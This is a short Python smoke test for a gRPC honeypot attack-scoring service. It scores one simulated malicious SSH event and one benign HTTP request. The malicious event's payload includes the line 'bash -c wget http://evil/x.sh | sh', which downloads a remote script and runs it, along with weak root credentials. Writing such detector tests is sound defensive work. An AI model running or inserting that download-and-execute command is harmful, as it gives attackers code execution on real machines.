"""Ad-hoc end-to-end smoke test for the gRPC attack-scoring path."""
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "proto" / "gen" / "python"))
sys.path.insert(0, str(ROOT / "phishguard"))

import aegisx_pb2 as pb
from app.grpc_server import score_attack_event
from app.intel.threat_intel import ThreatIntel

payload = """login: root
Password: admin123
bash -c wget http://evil/x.sh | sh
"""

intel = ThreatIntel()
e = pb.HoneypotEvent(
    id="ev-test", protocol="ssh", source_ip="45.155.205.233",
    source_port=54321, target_port=2222,
    username="root", password="admin123", payload=payload,
    metadata={"auth_plugin": "ssh"},
)
r = score_attack_event(e, intel)
print("score:", r.threat_score)
print("severity:", pb.Severity.Name(r.severity), "| verdict:", pb.Verdict.Name(r.verdict))
print("cves:", list(r.related_cves))
print("indicators:", list(r.indicators))
print("mitigation:", list(r.mitigation))

# benign event should score low
benign = pb.HoneypotEvent(
    id="ev-benign", protocol="http", source_ip="8.8.8.8",
    source_port=4444, target_port=8080, method="GET", path="/robots.txt",
)
r2 = score_attack_event(benign, intel)
print("benign verdict:", pb.Verdict.Name(r2.verdict), "score:", r2.threat_score)